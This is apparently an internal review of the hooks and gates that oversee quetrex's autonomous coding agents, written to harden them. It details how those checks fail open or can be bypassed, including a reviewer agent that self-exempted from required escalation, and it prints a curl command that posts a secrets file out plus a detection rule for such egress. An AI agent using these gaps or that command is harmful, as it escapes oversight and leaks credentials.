# quetrex-base vs. "Claude Code in Action" — consolidated gap analysis

Five reviewers, one slice each, all findings verified against the real repo.
Source documents: `.review/course-notes.md`, `.review/base-inventory.md`.

---

## THE ONE-PARAGRAPH VERSION

The verification *design* is ahead of Anthropic's own course in ten distinct places — commit-pinning against stale-green, fail-closed-on-timeout, requirement-computed-from-diff, bounded loops with a durable escalation artifact, PreToolUse-beneath-bypassPermissions, two-tier secret detection with false-positive discipline, negative-space reporting. The *wiring* is behind it, and the gap is not subtle: on a fresh clone every hook silently no-ops, the verify chain resolves to a single command, and the two flagship gates have never executed. Fixing the wiring converts an unusually sophisticated design into an unusually sophisticated system. Most of P0 is a handful of lines.

---

## P0 — BROKEN RIGHT NOW

### 1. Committed hook paths are `~/.claude/...`, so every hook no-ops in a fresh clone, cloud routine, or CI runner
`.claude/settings.json:41-99` — all six `command` entries are `bash ~/.claude/hooks/<x>.sh`. On a machine without the global npm install that is exit 127, and per course L5 **anything other than 0 or 2 is non-blocking**: stderr logged, Claude carries on. Enforcement fails open, silently, with no warning.

The repo *ships* all ten hook scripts, committed and `chmod 755`, referenced by nothing. `quetrex-install-project-gates.sh:152-160` exists precisely to avoid this, writing `bash "${CLAUDE_PROJECT_DIR:-.}/.claude/hooks/<x>.sh"` "so paths resolve in a fresh clone" — and `:10-12` states the rule: "a cloud routine only ever sees what is committed, never the operator's global `~/.claude`." **The repo's own committed settings violate the rule the repo wrote.**

→ Rewrite the six commands to `${CLAUDE_PROJECT_DIR:-.}`. Add a test asserting no committed settings command contains `~/.claude`. *6-line diff, highest value-per-character change in the review.*

### 2. `verify-gate.sh` and `merge-gate.sh` are wired in no settings file, and never have been
Verified three ways: absent from `.claude/settings.json`, from `.claude/settings.local.json`, and from the live `~/.claude/settings.json`; `git log -S'verify-gate' -- .claude/settings.json` is **empty** — never wired, not a regression.

**Important nuance the reviewers initially missed:** their absence from the *global* config is deliberate and documented in `cf4587b` — "never wired into the user's global config, since verify-gate autodetects a chain from any package.json." That reasoning is sound. The defect is narrower and still real: **quetrex-base has never run `/q-init` on itself**, so the repo shipping the engine is the one repo the engine does not protect. Running `merge-gate.sh` against the repo as it stands produces:
```
MERGE GATE (REWORK): .quetrex/verify-ledger.jsonl is missing or empty —
QA never proved the verify chain green.
```
Every PR that has merged here merged only because the gate is off.

→ Run `quetrex-install-project-gates.sh` against quetrex-base itself: `Stop`→verify-gate (900s), `SubagentStop`→verify-gate (600s), `merge-gate` in the existing PreToolUse/Bash group (60s).

### 3. The live merge policy is the superseded one, and it hangs unattended runs
`~/.claude/settings.json:76` still wires `enforce-merge-approval.sh`, whose own header declares it superseded, and `:91` still wires `security-check.sh`, a strictly weaker duplicate of `secret-scan.sh` running beside it. Commit `cf4587b` claims it dropped both — but `install.js` reconciles hooks *additively* by basename. It can add a gate to an existing install; it can never remove one. **The removal half of that commit never landed on any machine that already had quetrex installed.**

`enforce-merge-approval.sh:29-33` returns `permissionDecision:"ask"` on every `gh pr merge`. Course L4 names this exact failure: `dontAsk` exists for unattended runs so "the pipeline keeps moving instead of hanging on an approval no one is there to give." The most autonomy-critical boundary in a product built on overnight runs is guarded by a synchronous human prompt.

→ Unwire and delete both. Give `install.js` a removal path for superseded basenames.

### 4. The verify chain on this repo is one command, and it isn't the one that matters
No `.quetrex/verify.json`; `.claude/CLAUDE.md:77` is `## Stack and Verification` with no fenced block; so `verify-gate.sh:190-199` falls through to autodetect, hits `package.json`, and finds only `test`. Run live, the ledger was a single line: `npm run test` → `node test/install.test.js`. No typecheck, no lint, no build — and **not** `test/merge-gate.test.sh`, the only test covering any hook.

→ Seed `.quetrex/verify.json` from `templates/verify.json`; add `bash test/merge-gate.test.sh` to `npm test`.

### 5. The CLAUDE.md chain extractor silently truncates on a `#` comment
`verify-gate.sh:170-183`. Awk rule order is heading → fence toggle → emit. A `# comment` **inside** the fenced block matches the heading rule first, sets `insec = 0`, and `next`s; the in-fence comment skip at `:180` is unreachable. Reproduced: a four-command chain containing one `# install deps if needed` line extracted as **one** command.

A fail-open in the exact place the header spends 24 lines swearing there is none. It doesn't error — it proves a *subset* green, reports green, and writes those lines to the ledger, which `merge-gate.sh:249-255` then reads as authoritative for the whole chain. A `# skip on CI` comment in a customer's CLAUDE.md silently disables everything below it, in both gates.

→ Evaluate the fence toggle before the heading rule; gate the heading rule on `!infence`. *Two lines.*

### 6. `git add -A` moves HEAD after the verdict is sha-pinned — the auto-merge path cannot complete
`.quetrex/` is neither tracked nor gitignored. The reviewer pins its verdict to HEAD (`reviewer.md:184`), then `git-workflow.md:101` runs `git add -A` — sweeping up `review-verdict.json`, the ledger, `state.json`, the plan — and `:108` commits, moving HEAD. §2a re-pins the *ledger* but nothing re-pins the *verdict*. `merge-gate.sh:225-227` denies: "the AUTO_MERGE verdict is for commit X, but HEAD is now Y." Gitignoring `.quetrex/` doesn't help — then nothing is staged and git-workflow stops at `:102`. Both branches broken; invisible only because merge-gate is off.

→ Gitignore the runtime artifacts except `project.json`/`verify.json`; stage explicit paths, never `-A`; re-pin the verdict in §2a symmetrically with the ledger.

### 7. `install.js`'s enforcement assertion validates presence, not wiring
`install.js:303-349` prints `INSTALL FAILED — the enforcement channel is broken` and exits 1. It checks that hooks exist and are executable, that the two gates are **present**, and that settings re-parses. It never asserts a hook is *reachable from a settings file*. The comment says "the enforcement channel must be real, not just copied bytes" — the check is exactly copied bytes.

**This is the mechanism by which finding 1 survived a P0 explicitly written to fix it: a loud, well-written guard pointed at the wrong invariant, whose passing was read as proof.**

→ Parse the merged settings and assert each expected basename appears under its expected event; for the two per-project gates assert present-but-unwired deliberately, and emit a visible notice when a repo has `.quetrex/` but no repo-local wiring — the state quetrex-base is in.

### 8. `install.js` overwrites `~/.claude/CLAUDE.md` on every update, deleting `#LESSONS`
`install.js:9` protects only `secrets.env`; everything else falls to `writeFresh` — full overwrite, no backup. Live proof: `~/.claude/CLAUDE.md:12` reads `(Place Lessons Here)` while the project file carries two real lessons. This is also the actual cause of the "half-applied rename," which recurs on every `npm i -g`.

→ Add `CLAUDE.md` to `PROTECTED`; or ship `quetrex-doctrine.md` and have a never-overwritten `CLAUDE.md` import it. Add a test asserting custom content survives an install.

---

## P1 — SAFETY HOLES

### 9. Four hooks fail open when `jq` is missing
`deny-guard.sh:9`, `enforce-branch.sh:10`, `security-check.sh:6`, `secret-scan.sh:24` all do `jq -r ... 2>/dev/null` then `[ -z "$cmd" ] && exit 0`. No `jq`, no enforcement, no trace. Only `merge-gate.sh:63-75,162-165` anticipates this with a jq-free `sed` fallback and a fail-closed deny.
→ Copy merge-gate's extraction; make unparseable input `exit 2` with a message on stderr.

### 10. `block()`'s no-jq fallback can emit malformed JSON, which is read as allow
`verify-gate.sh:132-134` hand-rolls escaping for backslash, double-quote and newline — nothing else. The string being escaped is `tail20` of a **failing build's stderr**, which routinely contains tabs, CRs, and ANSI escapes. Malformed JSON → dropped → exit 0 with no decision → allow. Verbatim the fail-open the surrounding block exists to prevent. Same exposure at `merge-gate.sh:154-157`.
→ Keep jq as primary; make the fallback `printf '%s\n' "$1" >&2; exit 2` — no JSON to malform.

### 11. Global hook timeouts are wrong by ~150×
`workflow-reminder`, `deny-guard`, `enforce-branch` = 5000; `auto-format` = 10000; `check-quetrex-update` = 3000. The field is **seconds**. A hung `deny-guard.sh` stalls the session for 83 minutes; `auto-format.sh` for nearly three hours. The repo's own values (30) are right. `secret-scan` is 30 in both — consistent with basename reconciliation adding it later and correctly leaving stale entries untouched.

This is load-bearing: `verify-gate.sh:101-116` derives its entire fail-closed budget from the external timeout.
→ Normalize to seconds; assert every wired timeout ≤ 900 in the post-install check.

### 12. Nothing mechanically checks the diff against the architect's ownership map
Searched hard. It exists in exactly one place and it is prose to an LLM: `reviewer.md:83`. `merge-gate.sh:288-297` and `git-workflow.md:78-79` open the plan **only** for `security_review_required`. So the artifact the entire parallel-developer architecture rests on — `architect.md:91` calls ownership "the enforceable contract developers are held to" — is enforced by nobody. A developer editing outside its lane produces course L8's exact failure: clean summary, unexpected file, four gates green because none look.
→ Add GATE 5 to `merge-gate.sh` reusing the `$CHANGED` it already computes at `:307`. Exempt `.quetrex/**` and lockfiles. ~15 lines.

### 13. `verifyQuick` is an unguarded weakening vector — and has never executed
`verify-gate.sh:149-156` substitutes `.verifyQuick[]` on SubagentStop. The header claims a "strict SUBSET"; **no code enforces subset-ness**, and `verify.json` lives in the customer's repo. `verifyQuick: ["true"]` passes every SubagentStop. Scoped honestly: the merge boundary holds, since GATE 3 reads `.verify`. Separately, **no settings file anywhere registers `SubagentStop`**, so in a pipeline defined by parallel worktree developers, no subagent is gated on finish and this code path has never run.
→ Require every `verifyQuick` entry to be a member of `verify[]`; fall back to the full chain on mismatch. Wire `SubagentStop`.

### 14. No hook covers secret *egress*
`secret-scan.sh` inspects only literal command/file content. A `curl -X POST … -d @$HOME/.claude/secrets.env` was verified allowed, exit 0, no output — the secret never appears in the command string, so neither tier fires.

Course L4 lists "sending sensitive data to external endpoints" among what auto mode's classifier blocks — but the **committed** profile is `dontAsk` (`:33`), which has no classifier, plus `skipDangerousModePermissionPrompt: true` (`:107`) and `bypassPermissions` on developer and qa. The profile shipped to customers is weaker than the one the operator runs, and it is the shipped one that governs unattended pipelines.
→ Keep `dontAsk` (right mode for the product) and add the coverage as a hook: fire when a command references a secret path (`secrets.env`, `.env*`, `auth.json`, `id_rsa`) alongside an egress verb (`curl`, `wget`, `nc`, `scp`). `ask`, not `deny`.

### 15. `deny-guard` false positives, reproduced — including blocking the *safe* force-push
- `grep -rn "git reset --hard" docs/` → denied (`deny-guard.sh:37`)
- `git push --force-with-lease origin feature/x` → denied (`deny-guard.sh:39`)
- `echo "docs say: git commit early" >> README` → denied (`enforce-branch.sh:17`)
- `git commit -m "initial"` in a fresh repo → denied (`enforce-branch.sh:17`)

Cause is substring matching anywhere in an arbitrary shell string instead of parsing the leading token — `deny-guard.sh:22` already does this correctly for `rm`. Narrower matchers cannot fix it; the substring genuinely is present.
→ Match the first token per pipeline segment. Stop blocking `--force-with-lease` (the safe form and the standard post-rebase remedy). Allow the initial commit when `git rev-parse HEAD` fails.

### 16. No PostToolUse lint/typecheck
Course L8 names two gates; quetrex has the Stop one and not the edit-time one. `auto-format.sh` formats, discards stderr, exits 0. So a type error from the *first* edit surfaces only at turn end, after paying the full 840s chain, and burns one of three self-heal attempts. Three such edits → `ESCALATION` → merge blocked → needs_human SMS. A per-file typecheck costs ~1s, and exit 2 feeds the error straight back for a silent fix.
→ Add `edit-gate.sh`, check-mode on the single edited file, ~10s cap, resolve the command from `verify.json`, never `--fix`.

### 17. Worktrees have no environment, and the pipeline can't tell that from broken code
`developer.md:8` and `database-architect.md:7` run `isolation: worktree`; `.gitignore:5,16-18` ignores `node_modules/` and `.env*`; a worktree never carries ignored files. No `.worktreeinclude` exists. So agents land in a tree with no deps and no env, then must make `next build` and a live migration exit 0. They burn all three self-heals "fixing" code that was never broken, then escalate — as a `bypassPermissions` agent flailing at a green build, exactly the state that produces a weakened test or a hardcoded credential.

Smoking gun that this already happened: `.claude/settings.local.json:5` allowlists a build command with a fake database URI and `AUTH_SECRET="build-secret"` inlined.
→ Add `.worktreeinclude`; have `/q-init` generate it; handle the manual `git worktree add` path in the skill; make missing env a *setup* failure to report, not a code failure to self-heal against.

### 18. Loop bounds are self-reported by the bounded party
`reviewer.md:195-205` increments the `.review_iter` that `:131` then reads to decide whether it must escalate. A crash, a kill, or an omitted `jq` leaves the counter flat. `verify-gate.sh:324-328` is correct by contrast — the *hook* increments, out-of-band.
→ Keep the counters (they carry semantic state) and add `maxTurns` frontmatter to every agent plus `--max-turns` to every routine and workflow. They bound different failure modes.

---

## P2 — THE PRODUCT GAP

### 19. "Routine-fired kanban" does not exist. Every entry point is a human typing a slash command.
`quetrex-api.sh:159-303` is entirely outbound — terminal → kanban. Nothing fires inbound. `/schedule` is referenced nowhere. The approval gate at `q-task-build.md:130-157` is a conversational turn in a terminal that must stay alive across the wait; `:254` concedes the dispatcher "runs in this session."

Course L6's **HTTP POST trigger** is the exact primitive that closes this — the only documented mechanism by which the kanban starts a run on Anthropic's infra with no terminal.
→ Kanban `scope_approved` → POST to a per-project build routine; create it from `/q-init` via `/schedule`; record the endpoint in `.quetrex/project.json`; split `/q-task-build` at the approval gate. Hourly cron as reconciliation for dropped POSTs, **not** the primary path (60-min latency breaks the product promise).

### 20. Routines can only push to `claude/*`. Every branch quetrex creates is `feature/*`.
Worked through rather than assumed. **Survives:** worktrees, local sub-branch commits (merged locally, never pushed), `merge-gate.sh:307`'s `main...HEAD` diff (the default branch is what was cloned), `reviewer.md:42`. **Breaks:** `git-workflow.md:176` `git push -u origin "$BRANCH"` — and with no push there is no PR and the pipeline has no terminus. Also breaks `/q-init`'s own `feature/q-init-adopt` push. **Untested, do not assume:** whether `gh pr merge` is affected, since that is an API merge under the token's permissions, not a push.
→ Wire merge-gate **first**, then loosen per repo — the restriction is currently the only real guardrail keeping an autonomous run off main, and quetrex's replacement for it is inert. Ship `branchPrefix` in `project.json` as the fallback (~8 files).

### 21. Headless cannot carry the pipeline — and `--bare` is worse
`claude --help` on this machine, verbatim: `--bare  Minimal mode: skip hooks, LSP, plugin --settings, --agents, --plugin-dir.` Course L6 recommends `--bare` for CI determinism and notes `-p` skips hook auto-discovery. So the natural CI move turns the entire enforcement layer off, silently, indistinguishable from green — compounded with finding 1, a cloud runner gets both failure modes at once.

Routines do **not** have this problem, and the cloud-enforcement machinery is already built (`quetrex-install-project-gates.sh:198-208`). Only the routine that would consume it is missing.
→ Record that `--bare` is forbidden for any quetrex pipeline invocation, with the reason. For headless, pass `--settings` with an absolute path. Reserve `-p` for stateless leaf calls (task classification, slug derivation) paired with `--output-format json --json-schema`. **Currently latent, not live** — no `claude -p` anywhere in the repo. Close it before headless lands.

### 22. No CI, and the reviewer graded its own homework
No `.github/`. The live verdict artifact records `"verdict": "AUTO_MERGE"` over 18 reviewed files with `"nativeReview": "not_run_no_pr"` and `"nativeSecurityReview": "not_available_in_env"`.

`reviewer.md:143` mandates ESCALATE_HUMAN when native review "errored or could not run on a non-trivial change." An 18-file rename across the config surface is not trivial. **The agent deciding the verdict is also the agent reporting whether independent review ran, and it self-exempted.** A CI check cannot do that — its exit status comes from the runner.
→ `verify.yml` (chain as a required status check) and `claude-review.yml` (`anthropics/claude-code-action@v1`, reviewer contract, `--max-turns 15 --bare --permission-mode dontAsk`, verdict as check-run output). `not_run_no_pr` becomes impossible by construction. Make GATE 2 deny when `.verdict == AUTO_MERGE` and `.inputs.nativeSecurityReview` is not `clean|issues`.

**Managed Code Review composes but cannot gate:** it never approves or blocks, has no autofix, and is team/enterprise only. For a per-seat BYO-compute product, partners on Pro/Max won't have it. Free upgrade where the plan allows; never a required stage.

### 23. `SessionStart` + `compact` is the highest-value missing hook
Course L5 flags it as an explicit gotcha — **not** PostCompact, whose output never reaches the conversation. On SessionStart, plain stdout is added to context, so no JSON contract is needed. quetrex runs multi-hour pipelines; compaction is a certainty. And because state lives on disk, re-injection is cheap and safe — the hook re-reads ground truth rather than summarizing chat.

Re-inject: `state.json` (`task`, `review_iter` — else the bounded loop silently restarts from zero), **`ESCALATION`** (most dangerous to lose: an agent that forgets it resumes self-healing, and `verify-gate.sh:317-320` *deletes* it on the next green, so a retry passing a truncated chain erases the escalation entirely), `plan/<TASK>.json` (post-compaction, `architect.md:11-12`'s "if it's not in the artifact it doesn't exist" becomes literally true and the ownership ban is unenforceable), `verify-attempts`, verdict `.sha`, current branch and worktree path.
→ ~25 lines, no JSON, no new dependency. Wire it committed and add it to the project-gates installer so it travels.

**Skip `PreCompact`/`PostCompact`** — everything worth preserving is already on disk. **`InstructionsLoaded`** is worth it as an *audit trail*, not a linter: log the loaded set with mtimes and hashes so "which CLAUDE.md was in context when this went wrong" is answerable. Pair it with the mechanical check that actually catches the drift — a repo test asserting no instruction file contains `/quetrex-` after the rename.

### 24. Two CLAUDE.md files load together and contradict each other on the one verbatim mandate
Both load at launch and stack (course L2), so every session carries ~190 lines where ~95 would do — and `.claude/CLAUDE.md:19` demands printing `/q-login`/`/q-init` while `~/.claude/CLAUDE.md:18` demands `/quetrex-login`/`/quetrex-init`. Root cause is structural: the file is authored to be the *global* one (`:24`'s skip-condition is only coherent from user scope) but is also checked in at project scope and shipped by `package.json:files`.
→ One owner per scope. Cut project CLAUDE.md to what's true of *this repo* — `#LESSONS` and the `## Verification` block `verify-gate.sh:170-183` parses. ~95 lines → ~20. Move the Fly.io token rule (machine- and company-specific, currently shipped to strangers) to a git-ignored `CLAUDE.local.md`.

### 25. `qa-verify` is an orphan, a phantom, and a leak
- **Orphan:** `grep -rn "qa-verify"` returns only self-references. Nothing routes to it, and its first body line says "Invoke as `/qa-verify`" — the opposite of course L3's fire-on-its-own model.
- **Phantom:** 194 lines, 57% mechanical shell that L3 says belongs in a script; `:165-177` advertise `scripts/qa-verify.sh` and `pnpm qa`, **neither of which exists**. An agent following those lines gets exit 127 with no protocol for it.
- **Missing L3's step 3:** it never reads a diff and never checks whether a test was weakened. That logic lives only in `qa.md`, reachable only via the full pipeline — the best idea in the repo, gated behind the ceremony it was invented to replace.
- **Leak:** `:112-118` greps for `api_key|secret|password|token` without excluding `.env*`, and `CLAUDE.md:88` says Fly tokens live in `.env.local`. `secret-scan.sh` scans command strings, not output, so it passes and dumps the file into context.
- **Hardcodes** `pnpm`/`biome`/TypeScript against `qa.md:56`'s explicit prohibition — and since skills fire automatically, in a Python or Rust partner repo it fires, fails four checks with command-not-found, and drops the agent into a "fix the issue immediately" protocol.
→ Write the script, cut SKILL.md under 60 lines, add a `reference.md` (no skill in the repo has one), promote the anti-weakening check into the script, broaden the trigger description, resolve the chain through `verify.json` and hardcode nothing.

### 26. Plugin packaging: the gates survive, the operating envelope does not
`hooks/hooks.json` wires hooks identically; per-agent `permissionMode` travels in frontmatter. So the model does **not** depend on writing settings.json. What's lost is `permissions.allow` — and `git-workflow` runs `acceptEdits` while its job is `git push` and `gh pr create`, neither of which is a "filesystem bash command" under L4. They run silently today only because of `Bash(git push:*)`/`Bash(gh pr:*)`, exactly what a plugin cannot ship. Unattended, **the terminal stage hangs.**
→ Deliver the allow-list via `/q-init` into the customer's project settings. **Keep `quetrex-install-project-gates.sh`** — a plugin installs per-user, so it replaces the *global* channel only; delete the per-project installer and routines lose all enforcement.
→ Name the plugin **`q`**: `/q:task-build` beats both `/quetrex-factory:q-task-build` and the pre-rename state. Sweep the nine `source ~/.claude/lib/...` sites to `${CLAUDE_PLUGIN_ROOT}` — they fail at runtime inside a command, not at install.
→ Port `assertHooksInstalled` to a SessionStart hook (better than the npm version — re-checks every session). The rest of install.js's sophistication is defensive machinery made necessary by writing into a directory it doesn't own; a plugin owns its directory.

### 27. Licensing: the token is the license, not the distribution channel
A git-sourced private marketplace's access control is just the git repo's — no stronger than the current `npm install -g github:` path, and neither claws back files a customer already has. The enforceable boundary already exists: **the kanban API token.** No token and every `q-task-*` command is inert markdown; revoke it and the product dies everywhere, simultaneously and retroactively.
→ Server-side seat check and expiry at token issuance. Use the marketplace only for discovery and versioning. Distribute with as little friction as possible.

### 28. Nothing tells a customer what quetrex runs on their machine
`docs/onboarding/quetrex-new-user-setup.html` has **zero** occurrences of `hook`, `permission`, `bypass`, `deny`, or `scan`. Meanwhile the plugin panel will show their security reviewer nine scripts firing on every Bash and every Write/Edit, two of which parse the full command string, plus a Stop hook that executes arbitrary shell read from a repo JSON file. Every one is defensible; none is explained.

And the course's exact cautionary pattern is present: `check-quetrex-update.sh` is a Stop hook making a network call (`npm show`, `npm list -g`) — the only quetrex hook that touches the network and the least valuable one. It also parses JSON with **python3** inside a Bash hook (silently no-ops where python3 is absent) and renders a status-line prompt for `/quetrex-update`, **a command the package does not ship** — while `README.md:7` says it doesn't exist and `:66,71` advertise it.
→ Ship `SECURITY.md` with a per-hook table (event, matcher, reads, blocks, writes, network). Delete `check-quetrex-update.sh` — then you can truthfully state *no Quetrex hook makes a network call and none transmits your code, commands, or credentials anywhere.* For an enforcement product sold to companies, that sentence is worth more than the feature.

### 29. Smaller
- **`/goal`: do not adopt** as the completion gate. Its evaluator reads only the transcript, so it cannot read the ledger or check `sha == HEAD` — it would accept a prose claim of green, exactly what `qa.md:15` exists to kill.
- **`/loop`: do adopt** for the epic dispatcher. `q-task-build.md:181` makes the kanban the state of truth and `qx_is_unblocked` recomputes readiness from the API, so the tick is genuinely stateless — nothing carries between iterations. This also removes the compaction exposure on the epic path.
- **`updatedInput` redaction:** adopt for `secret-scan.sh`'s **Bash** matcher (the secret is usually incidental; a redacted command fails at the remote with a clear auth error — better feedback than a refusal an unattended agent may thrash against). **Keep `deny` for Write|Edit** — a silently-placeholdered key written to source produces a file the agent believes holds a working credential. Echo back the whole input object via `.tool_input | .command = $redacted`; substitute globally, not `head -n1`; **Tier B must stay deny** (it is heuristic by design).
- **`/code-review --fix`** as a pre-step in `q-task-rework` for the nit tier, so trivial findings don't spin the whole pipeline or burn a `review_iter`.
- **Schema-validate the control artifacts.** `reviewer.md:172` builds the verdict with `jq -n --argjson` and hand-quoted JSON-in-shell; any finding containing a quote or newline is a live corruption risk. Add a SubagentStop hook that JSON-Schema-validates `plan/*.json`, `review-verdict.json`, `security-findings.json` and exits **2**.
- **Route QA's `NOT VERIFIED` to an artifact.** It's cardinal rule #5 (`qa.md:19`) but lives in chat prose — and `reviewer.md:32` instructs the reviewer to ignore exactly that channel. Right to distrust QA's *claims*; but the same instruction discards QA's *coverage gaps*, which the reviewer most needs and cannot reconstruct. Add `.quetrex/qa-report.json`.
- **Single-unit scope gate.** The epic path has one (`q-task-build.md:130-156`, DAG-validated before asking); the single-unit path has none and `architect.md:139` forbids one. Your own `#LESSONS` describe the product as "plan → tap Approve from the phone → automated build."
- **`/q-task-merge` doesn't exist** but is advertised in `CLAUDE.md:36,50`, `README.md:63`, `git-workflow.md:14,179,199`, `dev-pipeline.md:94,106`, and inside `merge-gate.sh`'s deny messages.
- **`git-workflow.md:91` gates on `APPROVE`** — a verdict the reviewer never emits and that `merge-gate.sh:209-213` treats as escalate-worthy. The two terminal gates disagree on the contract.
- **`dev-pipeline.md` declares itself "the single canonical definition"** while contradicting the agent files on three points (artifact path, git-workflow's model, the review verdict shape).

---

## WHERE THE DESIGN BEATS THE COURSE — do not regress these

All five reviewers wrote this section unprompted by each other.

1. **Commit-pinning against stale-green.** The course has no concept of it. Three independent pins to HEAD: ledger `sha`, verdict `sha`, findings `head_sha`. A green proven against an earlier commit cannot authorize a later one.
2. **Fail-closed on timeout.** An internal wall-clock budget kept under the external hook timeout, per-command `timeout`/`gtimeout`, SIGKILL watchdog, and budget exhaustion treated as RED. The naive Stop hook the course sketches fails *open* on a hang.
3. **Refusal to launder environment errors.** Exit 127 / "command not found" / ENOENT is RED, full stop — the most common way a real Stop gate degrades into a no-op, named and closed.
4. **Requirement computed from the diff, not the plan.** A 30-term sensitive-path regex plus an added-lines regex, explicitly so "a plan that simply omits the flag cannot ship sensitive code unreviewed." Closes a bypass-by-omission the course doesn't discuss.
5. **PreToolUse as the layer *beneath* `bypassPermissions`.** Three hooks document that a `deny` fires before the permission engine and survives `--dangerously-skip-permissions`. The course covers hooks and permission modes separately and never connects them.
6. **Bounded loops whose exhaustion is a durable cross-gate artifact.** `ESCALATION` is written by one gate and hard-blocked on by another, with an explicit instruction not to delete it to force a merge.
7. **Negative-space reporting.** "State what you did NOT verify" as a cardinal rule whose omission is itself a FAIL. The course asks for evidence attached; requiring a declaration of *absent* evidence is strictly stronger.
8. **Anti-anchoring as a structural invariant.** The course recommends a cold second opinion as an optional closing step; here it's enforced at every stage, with the reason stated ("it is an anchoring trap").
9. **Two-tier secret detection with false-positive discipline** — entropy scoped to an assignment beside a keyword, explicitly so lockfile digests stay quiet, because "false positives erode trust in the gate."
10. **Post-install enforcement assertion.** The plugin system has no equivalent. Port it (and fix its invariant, finding 7).

---

## SUGGESTED ORDER

1. Findings 1, 5, 11 — three small diffs, all fail-opens (paths, awk, timeouts).
2. Findings 2, 3, 4 — run the project-gates installer on quetrex-base itself, delete the superseded hooks, seed `verify.json`. *After this the repo is protected by its own engine for the first time.*
3. Findings 6, 7, 8 — the artifact deadlock and the two install.js defects.
4. Findings 9, 10, 12, 13 — remaining fail-opens plus the ownership gate.
5. Finding 22 — CI, which makes every gate verifiable by something that isn't an agent.
6. Findings 19, 20 — the routine trigger and the branch constraint. *This is where the product model becomes real.*
7. Everything else.
